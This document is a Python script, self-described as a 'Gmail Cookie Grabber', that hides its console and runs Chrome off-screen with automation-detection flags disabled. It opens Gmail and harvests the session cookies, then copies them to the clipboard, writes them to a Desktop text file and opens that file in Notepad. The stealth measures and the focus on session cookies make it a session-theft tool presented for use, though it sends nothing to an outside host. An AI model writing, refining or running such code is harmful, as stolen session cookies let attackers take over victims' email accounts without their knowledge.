import time
import pyperclip
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import os
import sys
import ctypes
import subprocess

# Hide console completely
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

start_time = time.time()
print("🍪 Gmail Cookie Grabber Started...")

options = Options()
options.add_argument("--disable-blink-features=AutomationControlled")
options.add_experimental_option("excludeSwitches", ["enable-automation"])
options.add_experimental_option("useAutomationExtension", False)
options.add_argument("--window-position=-10000,-10000")
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")

print("📧 Opening Gmail...")
try:
    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=options
    )
except:
    print("Installing ChromeDriver...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "webdriver-manager"])
    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=options
    )

driver.get("https://mail.google.com")
print("⏳ Waiting for Gmail (8 seconds)...")
time.sleep(8)

print("🍪 Getting cookies...")
cookies = driver.get_cookies()

if not cookies:
    time.sleep(10)
    cookies = driver.get_cookies()

if not cookies:
    print("❌ No cookies. Make sure you're logged in.")
    driver.quit()
    sys.exit()

result = f"🍪 GMAIL COOKIES ({len(cookies)})\n"
result += "═" * 40 + "\n\n"
for i, cookie in enumerate(cookies, 1):
    result += f"{i}. {cookie['name']}\n"
    result += f"   {cookie['value'][:70]}\n"
    result += f"   Domain: {cookie['domain']}\n\n"
result += "═" * 40 + "\n"
result += f"✅ Total: {len(cookies)} cookies\n"

try:
    pyperclip.copy(result)
    print("📋 Copied to clipboard!")
except:
    pass

# Save to Desktop
desktop = os.path.join(os.path.expanduser("~"), "Desktop")
filepath = os.path.join(desktop, "gmail_cookies.txt")
with open(filepath, "w", encoding="utf-8") as f:
    f.write(result)
print(f"💾 Saved to: {filepath}")

driver.quit()
print(f"⏱️ Time: {round(time.time() - start_time, 2)} seconds")
print("✅ Done!")

# Open file
try:
    os.system(f'notepad "{filepath}"')
except:
    pass

# Auto exit after 2 seconds
time.sleep(2)